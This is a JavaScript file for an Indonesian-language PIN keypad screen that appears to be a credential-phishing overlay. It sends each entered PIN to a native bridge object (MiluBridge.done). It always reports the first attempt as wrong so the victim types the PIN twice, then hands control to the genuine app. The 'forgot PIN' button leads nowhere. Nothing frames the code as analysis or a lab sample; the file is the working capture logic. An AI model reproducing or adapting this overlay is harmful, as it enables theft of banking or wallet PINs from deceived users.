(() => {
  const PIN_LEN = 6;
  const dots = Array.from(document.querySelectorAll("#pinDots .dot"));
  const keypad = document.getElementById("keypad");
  const forgotBtn = document.getElementById("forgotBtn");
  const toastEl = document.getElementById("toast");

  let pin = "";
  let submitCount = 0;
  let locked = false;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function renderDots() {
    dots.forEach((dot, index) => {
      dot.classList.toggle("is-filled", index < pin.length);
    });
  }

  function shakeDots() {
    dots.forEach((dot) => {
      dot.classList.remove("is-shake");
      void dot.offsetWidth;
      dot.classList.add("is-shake");
    });
  }

  function clearPin() {
    pin = "";
    renderDots();
  }

  function submitPin() {
    if (locked) {
      return;
    }
    locked = true;
    const value = pin;
    submitCount += 1;
    reportDone(value);

    if (submitCount < 2) {
      toast("PIN yang Anda masukkan salah");
      shakeDots();
      window.setTimeout(() => {
        clearPin();
        locked = false;
      }, 350);
      return;
    }

    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 280);
  }

  function pushDigit(digit) {
    if (locked || pin.length >= PIN_LEN) {
      return;
    }
    pin += digit;
    renderDots();
    if (pin.length === PIN_LEN) {
      window.setTimeout(submitPin, 120);
    }
  }

  function deleteDigit() {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    renderDots();
  }

  function renderKeypad() {
    const cells = [
      { type: "digit", value: "1" },
      { type: "digit", value: "2" },
      { type: "digit", value: "3" },
      { type: "digit", value: "4" },
      { type: "digit", value: "5" },
      { type: "digit", value: "6" },
      { type: "digit", value: "7" },
      { type: "digit", value: "8" },
      { type: "digit", value: "9" },
      { type: "empty" },
      { type: "digit", value: "0" },
      { type: "del" },
    ];
    keypad.innerHTML = "";
    cells.forEach((cell) => {
      if (cell.type === "empty") {
        const spacer = document.createElement("span");
        spacer.className = "key key-empty";
        spacer.setAttribute("aria-hidden", "true");
        keypad.appendChild(spacer);
        return;
      }
      if (cell.type === "del") {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.className = "key key-del";
        btn.setAttribute("data-key", "del");
        btn.setAttribute("aria-label", "Hapus");
        btn.innerHTML =
          '<svg viewBox="0 0 32 24" width="30" height="22" aria-hidden="true">' +
          '<path fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" d="M14 5L6 12l8 7"/>' +
          '<path fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" d="M8 12h18"/>' +
          "</svg>";
        keypad.appendChild(btn);
        return;
      }
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "key";
      btn.setAttribute("data-key", cell.value);
      btn.textContent = cell.value;
      keypad.appendChild(btn);
    });
  }

  keypad.addEventListener("click", (event) => {
    const btn = event.target.closest("[data-key]");
    if (!btn) {
      return;
    }
    const key = btn.getAttribute("data-key");
    if (key === "del") {
      deleteDigit();
      return;
    }
    if (/^\d$/.test(key)) {
      pushDigit(key);
    }
  });

  forgotBtn.addEventListener("click", () => {
    toast("Masukkan PIN untuk melanjutkan");
  });

  renderKeypad();
  renderDots();
})();
